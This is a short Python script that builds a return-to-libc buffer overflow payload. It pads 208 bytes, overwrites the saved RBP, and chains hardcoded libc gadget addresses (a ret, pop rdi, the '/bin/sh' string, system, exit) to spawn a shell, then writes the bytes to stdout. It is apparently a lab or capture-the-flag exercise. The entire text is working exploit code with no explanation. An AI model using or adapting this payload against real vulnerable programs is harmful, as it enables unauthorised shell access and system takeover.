import sys
import struct

libc_base_address = 0x007ffff7dcd000
ret = libc_base_address + 0xbeeb1
pop_rdi = libc_base_address + 0x23b72
bin_sh = libc_base_address + 0x1b45bd
system_function = libc_base_address + 0x522c0
exit_function = libc_base_address + 0x46a70

buf = b"A"* 208
buf += b"BBBBBBBB" #RBP overwrite
#buf += struct.pack('<Q',0x7ffffffffde18)  #RIP overwrite
buf += struct.pack('<Q', ret)
buf += struct.pack('<Q', pop_rdi)
buf += struct.pack('<Q', bin_sh)
buf += struct.pack('<Q', system_function)
buf += struct.pack('<Q', exit_function)

sys.stdout.buffer.write(buf)